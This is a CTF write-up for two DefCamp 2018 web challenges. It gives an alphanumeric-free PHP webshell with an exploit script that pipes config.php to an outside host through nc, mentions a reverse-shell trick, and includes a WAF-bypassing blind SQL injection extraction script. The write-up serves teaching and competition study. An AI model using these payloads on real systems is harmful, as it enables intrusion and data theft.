# DefCamp CTF Finals 2018

**It's recommended to read our responsive [web version](https://balsn.tw/ctf_writeup/20181108-defcampctffinal/) of this writeup.**


 - [DefCamp CTF Finals 2018](#defcamp-ctf-finals-2018)
   - [Web](#web)
     - [Scribbles](#scribbles)
       - [Other failed attempts](#other-failed-attempts)
       - [Postscript](#postscript)
     - [TicketCore](#ticketcore)
       - [Solution 1](#solution-1)
       - [Solution 2](#solution-2)
       - [Failed attempts](#failed-attempts)


## Web

### Scribbles

(shw, bookgin, RB363, written by bookgin)

Here is the server source code:

```php
 <?php

require('config.php');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
  highlight_file(__FILE__);
  exit;
}
if (empty($_GET['action'])) {

  $data = $_POST['data'];
  $name = uniqid();

  $payload = "data=$data&name=$name";
  $post = http_build_query([
    'signature' => hash_hmac('md5', $payload, FLAG),
    'payload' => $payload,
  ]);

  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, "http://127.0.0.1" . $_SERVER['REQUEST_URI'] . "?action=log");
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, $post);

  echo curl_exec($ch);

} else {

  if (hash_hmac('md5', $_POST['payload'], FLAG) !== $_POST['signature']) {
    echo 'FAIL';
    exit;
  }

  parse_str($_POST['payload'], $payload);

  $target = 'files/' . time() . '.' . substr($payload['name'], -20);
  $contents = $payload['data'];
  $decoded = base64_decode($contents);
  $ext = 'raw';

  if (isset($payload['ext'])) {
    $ext = (
      ( $payload['ext'] == 'j' ) ? 'jpg' :
      ( $payload['ext'] == 'p' ) ? 'php' :
      ( $payload['ext'] == 'r' ) ? 'raw' : 'file'
    );
  }

  if ($decoded !== '') {
    $contents = $decoded;
    $target .= '.' . $ext;
  }

  if (strlen($contents) > 37) {
    echo 'FAIL';
    exit;
  }

  file_put_contents($target, $contents);

  echo 'OK';
}
```

First let's try to overwrite ` $name` by injecting data of this line `$payload = "data=$data&name=$name";`

```php
$data="a&name=sl0wp0ke.php\x00";
```

Both uniqid() and time() are predicable, so we can infer the filename. After checking the content, we found that the null byte injection works because curl seems to truncate the data after a null byte.

Than, intuitively, we should create a webshell by modifying the `ext` here:

```php
  if (isset($payload['ext'])) {
    $ext = (
      ( $payload['ext'] == 'j' ) ? 'jpg' :
      ( $payload['ext'] == 'p' ) ? 'php' :
      ( $payload['ext'] == 'r' ) ? 'raw' : 'file'
    );
  }
```

However this is a pitfall. Because of the precedence of operators, the tenary is [not working as expected](https://stackoverflow.com/questions/5235632/stacking-multiple-ternary-operators-in-php):
```php
var_dump(true ? 'a' : true ? 'b' : 'c'); // b
var_dump(true ? 'a' : false ? 'b' : 'c'); // b
// is exactly the same
var_dump((true ? 'a' : false) ? 'b' : 'c'); // b
```

But can we still create a file with extension `php`? Take a closer look of the lines below:

```php
  $decoded = base64_decode($contents);
   ...
  if ($decoded !== '') {
    $contents = $decoded;
    $target .= '.' . $ext;
  }
   ...
  file_put_contents($target, $contents);
```

If we can make `$decoded` empty, the filename will not be appended `$ext`! But how can we create a webshell with empty content? The trick is `base64_decode` will ignore invalid characters:

```php
php > var_dump(base64_decode("W!V!V!Q"));
string(3) "YUP"
```

Now we can write any content without alphanumeric characters to a php file. However there is a constraint of the webshell : it should be less than 37 bytes. How do we bypass this?

1. short tag: The remote doesn't support short_tag `<?`, but [we can use `<?=` instead](https://softwareengineering.stackexchange.com/questions/151661/is-it-bad-practice-to-use-tag-in-php).
2. PHP supports backtick to run shell command.
3. To run arbitrary payload, we have to use `$_GET` to pass the parameter.

```php
<?=
// The content cannot contain null bytes so we use string concat
$_=_.("\x18\x1a\x0b"^___);  // _GET
$_=$$_; // now we have $_GET
`{$_[_]}`; // `$_GET["_"]`
```

The payload is 37 bytes. [kaibro from DoubleSigma](https://github.com/w181496/CTF/tree/master/dctf2018-final/Scribbles) uses a cleverer NOT trick to print the `config.php`.

```python
#!/usr/bin/env python3
import requests
s = requests.session()
url = 'https://scribbles.dctf18-finals.def.camp/'
r = s.post(url, data={'data': '<?=$_=_.("\x18\x1a\x0b"^___);$_=$$_;`{$_[_]}`;&name=sl0wp0ke.php\x00'})
print(r.text)
s.get('https://scribbles.dctf18-finals.def.camp/files/1541696874.sl0wp0ke.php?_=cat%20../config.php%20|%20nc%20240.240.240.240%2012345')
```

Reference:
- [my writeup in 2018 suctf](https://balsn.tw/ctf_writeup/20180526-suctf/#getshell-(unsolved,-written-bookgin))

- [phithon's blog (Chinese)](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html)

#### Other failed attempts

- retrieve `FLAG` of hash_hmac
    - Although we can control the payload, we can't even get the signature. The request is sent to localhost.
- SSRF in http_build_query
    - Nope, the request is sent to localhost.
- Using Unicode to bypass strlen check
    - but `strlen("我") === 3` It will return the number of bytes.

#### Postscript

The shortest payload I can think of is:
```php
<?=`. ./?*=*`;
```
First, we'll create a file `123456789.username=.raw` with a reverse shell payload. Then, we use this trick `. ./filename` to   use sh to interpret a plaintext file (refer to [phition's blog](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html)). Also we represent the filaname using wildcard characters`?*=*`. The question mark is required. Otherwise the PHP will interpret the string as a comment.

This payload may not work but I think it's worth to mention:)

### TicketCore

(bookgin, sasdf, sces60107, written by bookgin)

In the challenge we can retrieve ticket with this API:

```
https://ticketcore.dctf18-finals.def.camp/printable-ticket/2006
https://ticketcore.dctf18-finals.def.camp/printable-ticket/2007
```

Each ticket has a unique `code`.

Let's do some fuzzing first:
```
/2006 #get ticket 2006
/000002006.000 #get tieckt 2006
/and # WAF
/drop # WAF
/if #WAF
/' # Server 500 Error
/'=' # get ticket 2006
/1 #This is a private VIP ticket that only real hackers have access to it!
```

This is apparently a SQL injection challenge, and our main objective is to retrieve the ticket no.1. 

`if`,`and`,`or` is WAFed, but we can still use `&&` `||` to execute blind SQL injection.
```
# get ticket 2006
/'=''&& 'hello='hello' || 'a'='
# ticket not found
/'=''&& 'hello='world' || 'a'='
```


Let's try to extract the `code` of first ticket (The error message indicates that the column is named `code`) to see if it's the flag. The flag format is `DCTF{hex_digit}`.

```
# return first ticket
/'=''&& (select code from tickets where id = 1)>'DCT' && (select code from tickets where id = 1)<'DCU'|| 'a'='
```
Bingo, but unfortunately `DCTF` is WAFed. We have to find another way to represent the string.


#### Solution 1

`0x` and most string function are WAFed. Eventually we use `0b00000001` to represent a string.

```python
#!/usr/bin/env python3
from urllib.parse import quote
import string
import requests
import base64
def b64(s):
    return base64.b64encode(s.encode()).decode()

s = requests.session()
cookies ={
# omitted
}
 
test = 'https://ticketcore.dctf18-finals.def.camp/printable-ticket/'

def isCorrect(r):
    if r.status_code != 200:
        print('syntax error')
        return  False
    if 'WAF 1337 Alert!' in r.text:
        print('WAF')
        return False
    elif 'Hmm, the ticket code is empty or missing. Please contact support!' in r.text:
        return False
    else:
        return True

def isWAF(r):
    return 'WAF 1337 Alert!' in r.text

flag = 'dctf{'

while True:
    bingo = False
    for i in '}0123456789abcdef':
        print(i)
        larger_than = '0b' + ''.join(['{:08b}'.format(ord(j)) for j in flag]) + '{:08b}'.format(ord(i)) + '00000000'
        less_than = '0b' + ''.join(['{:08b}'.format(ord(j)) for j in flag]) + '{:08b}'.format(ord(i)) + '01011010'
        print(larger_than)
        r = s.get(test + quote(f"'=''&& (select code from tickets where id = 1) > {larger_than} && (select code from tickets where id = 1) < {less_than} || 'a'='"), cookies=cookies)
        if isCorrect(r):
            print('bingo')
            bingo = True
            flag += i
            print('flag', flag)
            break
        else:
            print('nope')
    if not bingo:
        print('not found next char .....')
        print(flag)
        exit(0)
```

The string comparision in MYSQL is case insensitive, but since the flag is in hex digit format it's fine.

Reference:
- [spyclub inctf 2018 writeup](https://spyclub.tech/2018/10/08/2018-10-08-inctf2018-web-challenge-writeup/)

#### Solution 2

It's worth to mention that the challenge filters all the [string functions](https://dev.mysql.com/doc/refman/8.0/en/string-functions.html) and almost all [crypto functions](https://dev.mysql.com/doc/refman/8.0/en/encryption-functions.html). The only function we can use is `to_base64`. Thus another solution is to encoded the flag in base64 format and compare with the string. However because the base64-encoded flag contains `if` which is filtered, we have to encode the flag **twice** and perform the string comparison.

Note that MySQL always perform case-insensitive comparison, so we'll lost the information of the case in base64. However fortunately since the flag is in hex digit, it not too hard to recover it.

Another thing is that mysql base64-encoded string will contain a newline character if the output is more than 76 bytes. WTF...... (though the behavior is the same as the linux `base64`, who will expect a newline there.....)
```
// return 1
// note substr index starts from 1
select substr(to_base64("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"),77,1)="\n"
```

#### Failed attempts
- using other function to bypass WAF
    - I write a simle script to try all string function of MySQL 8.0. All of them are filtered except to_base64.
- using other statement to bypass WAF
    - Yeah both `select` and `where` are not filterd. Maybe there are some useful statements which can be used to bypass WAF? But I don't think is possible because we want to manipulate the string itself.
